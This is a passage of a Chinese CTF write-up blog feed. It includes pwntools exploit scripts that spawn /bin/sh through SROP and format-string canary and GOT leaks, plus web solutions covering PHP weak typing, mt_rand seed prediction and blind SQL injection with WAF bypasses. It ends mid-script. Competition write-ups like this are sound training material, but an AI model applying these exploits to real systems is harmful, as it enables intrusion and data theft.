class="line">payload = p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload += p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload = payload[:<span class="number">15</span>]</span><br><span class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="第二种解法-infoleak"><a href="#第二种解法-infoleak" class="headerlink" title="第二种解法 infoleak"></a>第二种解法 infoleak</h3><p>通过构造rax，修改为write的调用号，我们可以leak出栈地址，随后，我们可以在leak出的栈地址写/bin/sh，之后就可以起shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">main_arena_off = <span class="number">0x001B07B0</span></span><br><span class="line">binsh_off = <span class="number">0x158E8B</span></span><br><span class="line"></span><br><span class="line">logger = logging.getLogger()</span><br><span class="line">logger.setLevel(logging.DEBUG) <span class="comment"># set to INFO in release mode</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">r = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *0x00000000004000BE</span></span><br><span class="line"><span class="comment">#b *0x00000000004000c0</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#r = remote(&quot;106.75.61.55&quot;,20000)</span></span><br><span class="line">r = remote(<span class="string">&quot;182.254.130.247&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">main = <span class="number">0x00000000004000B0</span></span><br><span class="line">syscall = <span class="number">0x00000000004000BE</span></span><br><span class="line">r.send(p64(main)+p64(main)+p64(main))</span><br><span class="line">raw_input(<span class="string">&quot;stop&quot;</span>)</span><br><span class="line"><span class="comment">#time.sleep(2)</span></span><br><span class="line">r.send(p8(<span class="number">0xbb</span>))</span><br><span class="line">raw_input(<span class="string">&quot;stop&quot;</span>)</span><br><span class="line"><span class="comment">#time.sleep(2)</span></span><br><span class="line">stack_addr = int(unpack(r.recv()[<span class="number">16</span>:<span class="number">24</span>],<span class="string">&quot;all&quot;</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%x&quot;</span>%stack_addr</span><br><span class="line">frame=SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0x400</span></span><br><span class="line">frame.rcx=<span class="number">0</span></span><br><span class="line">frame.rsi=stack_addr</span><br><span class="line">frame.eflags=<span class="number">0x246</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line"><span class="comment">#frame.csgsfs=0x002b000000000033</span></span><br><span class="line">frame.r11=<span class="number">0x246</span></span><br><span class="line">frame.rsp=stack_addr</span><br><span class="line">frame.rip=<span class="number">0x00000000004000BE</span></span><br><span class="line">r.send(p64(main)+<span class="string">&quot;/bin/sh&quot;</span>+p8(<span class="number">0</span>)+bytes(frame))</span><br><span class="line">raw_input(<span class="string">&quot;stop&quot;</span>)</span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line"></span><br><span class="line">r.send(p64(syscall)+<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line"></span><br><span class="line">frame.rax=<span class="number">59</span></span><br><span class="line">frame.rdi=stack_addr+<span class="number">0x10</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">r.send(p64(main)+<span class="string">&quot;/bin/sh&quot;</span>+p8(<span class="number">0</span>)+bytes(frame))</span><br><span class="line">raw_input(<span class="string">&quot;stop&quot;</span>)</span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line">r.send(p64(syscall)+<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;stop&quot;)</span></span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="hiddenlove"><a href="#hiddenlove" class="headerlink" title="hiddenlove"></a>hiddenlove</h2><p>这是 Hitcon 2016 babyheab题改的。</p><p><a href="https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/baby-heap-300">https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/baby-heap-300</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 360春秋杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决升级pwntools  gdb.attach不能弹起gdb</title>
      <link href="after-upgrade-gdb-wont-attach-to-process.html"/>
      <url>after-upgrade-gdb-wont-attach-to-process.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/fix-gdb-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/fix-gdb-01.jpg"></a></p><p>发现 <code>gdb.attach</code>弹不出gdb窗口了…</p><p> 后来发现问题出在ubuntu身上，</p><p>Ubuntu引入了一个补丁来禁止非root用户对非子进程的追踪 - 即。只有作为另一个进程的父进程的进程可以为普通用户追踪它，而root仍然可以追踪每个进程。所以为什么你可以使用gdb来通过sudo来附加。</p><p>所以我们需要使用root权限，来运行我们的<code>gdb.attach</code></p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>但是，我们不也非得用<code>sudo</code></p><h2 id="临时解决方案"><a href="#临时解决方案" class="headerlink" title="临时解决方案"></a>临时解决方案</h2><p><code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code></p><h1 id="长久解决方案"><a href="#长久解决方案" class="headerlink" title="长久解决方案"></a>长久解决方案</h1><p>修改 <code>/etc/sysctl.d/10-ptrace.conf</code></p><p>​    修改内容 <code>kernel.yama.ptrace_scope = 1</code> </p><p>​    结果为       <code>kernel.yama.ptrace_scope = 0    </code></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届全国网络空间安全技术大赛(线上初赛)</title>
      <link href="cstc-xatu-writeup.html"/>
      <url>cstc-xatu-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="第三届全国网络空间安全技术大赛-线上初赛"><a href="#第三届全国网络空间安全技术大赛-线上初赛" class="headerlink" title="第三届全国网络空间安全技术大赛(线上初赛)"></a>第三届全国网络空间安全技术大赛(线上初赛)</h1><p>##web 1 签到题<br>1.老套路看源码发现是php隐士转换直接 <code>Username=QNKCDZO，password=240610708</code> ，得到下一个地址<a href="http://117.34.111.15:84/json.php">http://117.34.111.15:84/json.php</a><br>2.继续右键看源码<br><a href="http://i.imgur.com/uzIyIK5.png" class="gallery-item"><img src="http://i.imgur.com/uzIyIK5.png"></a></p><p>3.又是弱类型</p><h1 id="Web2-抽抽奖"><a href="#Web2-抽抽奖" class="headerlink" title="Web2 抽抽奖"></a>Web2 抽抽奖</h1><blockquote><p>抽奖呗 <a href="http://117.34.111.15/">http://117.34.111.15/</a></p></blockquote><p>看到 <code>jQuery.js</code> 有点异常，打开源码，<a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">解码</a>得到以下代码：</p><p>然后直接在控制台输入 <code>getFlag</code>，得到 <code>flag</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">window</span>.getFlag=<span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;  <span class="keyword">if</span>(text==<span class="string">&#x27;1&#x27;</span>)&#123;      alert(<span class="string">&quot;你最厉害啦!可惜没flag&quot;</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;2&#x27;</span>)&#123;      alert(<span class="string">&quot;你太厉害了,竟然是二等奖&quot;</span>)   &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;3&#x27;</span>)&#123;      alert(<span class="string">&quot;你好厉害,三等奖啊&quot;</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;flag&#x27;</span>)&#123;       alert(<span class="string">&quot;flag&#123;951c712ac2c3e57053c43d80c0a9e543&#125;&quot;</span>)     &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;0&#x27;</span>)&#123;      alert(<span class="string">&quot;再来一次吧&quot;</span>)  &#125; &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Web3-继续抽"><a href="#Web3-继续抽" class="headerlink" title="Web3 继续抽"></a>Web3 继续抽</h1><p>查看源代码，看代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">&#x27;get.php?token=&#x27;</span> + $(<span class="string">&quot;#token&quot;</span>).val() + <span class="string">&quot;&amp;id=&quot;</span> + encode(md5(jsctf2)), <span class="function"><span class="keyword">function</span>(<span class="params">jsctf3</span>) </span>&#123;</span><br><span class="line">    alert(jsctf3[<span class="string">&#x27;text&#x27;</span>])</span><br><span class="line">&#125;, <span class="string">&#x27;json&#x27;</span>);</span><br></pre></td></tr></table></figure><p>于是构造请求 <code>&#39;http://117.34.111.15:81/get.php?token=&#39;+token+&#39;&amp;id=&#39;+id</code> ，试了下 <code>encode(md5(&#39;1&#39;))、encode(md5(&#39;2&#39;))、encode(md5(&#39;3&#39;))</code>，均没出来 <code>flag</code> ，于是写了 <code>python</code> 脚本，跑构造好的字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyquery</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&#x27;zd.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">    id = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    url = <span class="string">&#x27;http://117.34.111.15:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch, br&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B150 MicroMessenger/6.5.1 NetType/WIFI Language/zh_CN&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    r = s.get(url=url,headers=headers).text</span><br><span class="line"></span><br><span class="line">    c = pyquery.PyQuery(r)</span><br><span class="line"></span><br><span class="line">    token = c(<span class="string">&#x27;#token&#x27;</span>).val()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url2 = <span class="string">&#x27;http://117.34.111.15:81/get.php?token=&#x27;</span>+token+<span class="string">&#x27;&amp;id=&#x27;</span>+id</span><br><span class="line"></span><br><span class="line">    r2 = s.get(url=url2,headers=headers)</span><br><span class="line">    str = r2.text</span><br><span class="line">    <span class="keyword">print</span> str.decode(<span class="string">&#x27;unicode_escape&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>), id</span><br></pre></td></tr></table></figure><p>于是跑出 <code>flag</code>，也就是当 <code>encode(md5(&#39;147&#39;))</code> 时，</p><h1 id="Web4-Wrong"><a href="#Web4-Wrong" class="headerlink" title="Web4  Wrong"></a>Web4  Wrong</h1><p>找到这个 <code>.index.php.swp</code> 通过恢复文件 <code>vim -r index.php</code> 得到下面源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span>(<span class="params">$pw_length =  <span class="number">10</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">$randpwd = <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)  </span><br><span class="line">&#123;  </span><br><span class="line">$randpwd .= chr(mt_rand(<span class="number">33</span>, <span class="number">126</span>));  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">return</span> $randpwd;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">mt_srand(time());</span><br><span class="line">$pwd=create_password();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($pwd==$_GET[<span class="string">&#x27;pwd&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;userLogin&#x27;</span>]==$_GET[<span class="string">&#x27;login&#x27;</span>])</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Good job, you get the key&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="string">&quot;Wrong!&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;userLogin&#x27;</span>]=create_password(<span class="number">32</span>).rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过小小的审计得到思路 把cookie删掉<br>就可以过第二个if($_SESSION[‘userLogin’]==$_GET[‘login’])</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function create_password($pw_length &#x3D;  10) </span><br><span class="line">&#123;  </span><br><span class="line">    $randpwd &#x3D; &quot;&quot;; </span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $pw_length; $i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        $randpwd .&#x3D; chr(mt_rand(33, 126));  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $randpwd;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">mt_srand(1492307701);</span><br><span class="line">$pwd&#x3D;create_password();</span><br><span class="line">var_dump($pwd);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过下面脚本得到一个随后的时间戳，用 <code>burp</code> 不断发包，等到时间到了设置的时间戳就会得到 <code>flag</code></p><p>##web4 so easy:<br>访问:<code>http://117.34.111.15:89/</code> 得到部分源码</p><p><a href="http://i.imgur.com/2MLmzn8.png" class="gallery-item"><img src="http://i.imgur.com/2MLmzn8.png"></a></p><ol><li><p>waf拦截了<code>逗号、空格、and、union</code>等关键字，但是没有过滤<code>mid、ascii、from等关键字</code>，因为过滤了and，那就利用Mysql的位运算<code>0&#39;^1^&#39;1</code>结果为0，拼接sql语句为<code>select role from  user where username =&#39;0&#39;^1^0</code>成功得到查询到admin的role</p></li><li><p>利用bool型盲注进行注入，用()代替空格，用from 1 代替,写一个脚本跑一下，得到密码: <code>37b1d2f04f594bfffc826fd69e389688</code></p><p> <a href="http://i.imgur.com/CWEovXF.png" class="gallery-item"><img src="http://i.imgur.com/CWEovXF.png"></a></p></li><li><p>利用注入的密码去登录</p><p> <a href="http://i.imgur.com/g6oxtms.png" class="gallery-item"><img src="http://i.imgur.com/g6oxtms.png"></a></p></li><li><p>这里直接用mysql字符问题解决，成功获取flag</p><p> <a href="http://i.imgur.com/5R2rXH0.png" class="gallery-item"><img src="http://i.imgur.com/5R2rXH0.png"></a></p></li></ol><p>##web5 just a test：<br>1.随手发现注入<br>直接sqlmap跑，开始一直在跑test1库，跑到后台管理账号密码，后台没有</p><p>2.列了一下数据库，看到了test库，想到题目才知道入坑了，但是跑不出来列得到列名为fl@g，尝试去跑内容，但是段都列不了，用尝试手工，成功获取到fl@g的列为f1ag(ps:坑就在@，mysql会把g当做变量，没办法查询，用反引号扩起来就好了)</p><p><a href="http://i.imgur.com/ClmCCbs.png" class="gallery-item"><img src="http://i.imgur.com/ClmCCbs.png"></a></p><p><a href="http://i.imgur.com/Xkcyt7V.png" class="gallery-item"><img src="http://i.imgur.com/Xkcyt7V.png"></a></p><p>因为extractvalue有32位的限制，直接把f1ag加在sqlmap的列的目录里面，直接dump吧</p><p><a href="http://i.imgur.com/pkyjJZN.png" class="gallery-item"><img src="http://i.imgur.com/pkyjJZN.png"></a></p><h1 id="Crypto1-签到"><a href="#Crypto1-签到" class="headerlink" title="Crypto1 签到"></a>Crypto1 签到</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ~ <span class="built_in">echo</span> <span class="string">&quot;ZmxhZ3tXZWlTdW9GeXVfQmllTGFuZ30=&quot;</span> | base64 -D</span><br><span class="line">flag&#123;WeiSuoFyu_BieLang&#125;                                 </span><br></pre></td></tr></table></figure><h1 id="Crypt2-200"><a href="#Crypt2-200" class="headerlink" title="Crypt2 200"></a>Crypt2 200</h1><p>小强不小心截获了两个老外同服务器的加密通信数据，看看他们在说些什么。。。</p><p>在通信流量中能找到 N 和E，猜测密文都是一样的，用共模攻击<br>得到 <code>flag&#123;flag&#123;Hc0mm0nModulusR$AH&#125;&#125;</code></p><h1 id="Bin1-Now"><a href="#Bin1-Now" class="headerlink" title="Bin1 Now"></a>Bin1 Now</h1><p>程序使用自修改代码、第三方标准库等手段，影响静态分析。程序输入在<code>00402047</code>处，接着在<code>004020E9</code>检查长度是否为9。通过<code>004038F0</code>输出调用定位到关键输出在<code>00402490</code>函数中，此控制此函数关键之跳的<code>dword_446184</code>是在<code>402640</code>函数中确定的。细看下此函数，发现关键算法也在此处，将输入和<code>xmmword_43AC00</code>分别运算后进行比较，因为<code>xmmword_43AC00</code>的计算结果为定值，整理下即可反算出输入<code>536724689</code>，代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">check = [<span class="number">0x0b</span>,<span class="number">0x06</span>,<span class="number">0x15</span>,<span class="number">0x0b</span>,<span class="number">0x04</span>,<span class="number">0x0e</span>,<span class="number">0x16</span>,<span class="number">0x10</span>,<span class="number">0x31</span>]</span><br><span class="line">input = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">s2 = check[<span class="number">3</span>*i+<span class="number">1</span>]/<span class="number">2</span></span><br><span class="line">s1 = check[<span class="number">3</span>*i]<span class="number">-2</span>*s2</span><br><span class="line">s3 = check[<span class="number">3</span>*i+<span class="number">2</span>]<span class="number">-5</span>*s2</span><br><span class="line">input += chr(s1+<span class="number">0x30</span>)+chr(s2+<span class="number">0x30</span>)+chr(s3+<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">print</span> input</span><br></pre></td></tr></table></figure><p>将输入代入程序即可得到后面一部分的flag：<code>0IdWan9&#125;</code><br>根据题目提示，终于在文件的详细资料里找到一串base64串，解之得到<code>flag&#123;aoot@mail:</code>。<br>所以最终flag:<code>flag&#123;aoot@mail:0IdWan9&#125;</code>。</p><h1 id="Bin2-Magical-Box"><a href="#Bin2-Magical-Box" class="headerlink" title="Bin2 Magical Box"></a>Bin2 Magical Box</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;117.34.80.134&quot;</span>, <span class="number">7777</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;you?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;aa&quot;</span> + p32(addr) + <span class="string">&quot;%5$s&quot;</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;login!aa&quot;</span>)</span><br><span class="line">    r.recv(<span class="number">4</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;you?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;%7$p&quot;</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;login!&quot;</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">canary = int(leak_canary(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] canary:&#123;0&#125;&quot;</span>.format(hex(canary))</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x0804B010</span></span><br><span class="line">leak_data = leak(printf_got)</span><br><span class="line">printf_addr = u32(leak_data[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">fflush_addr = u32(leak_data[<span 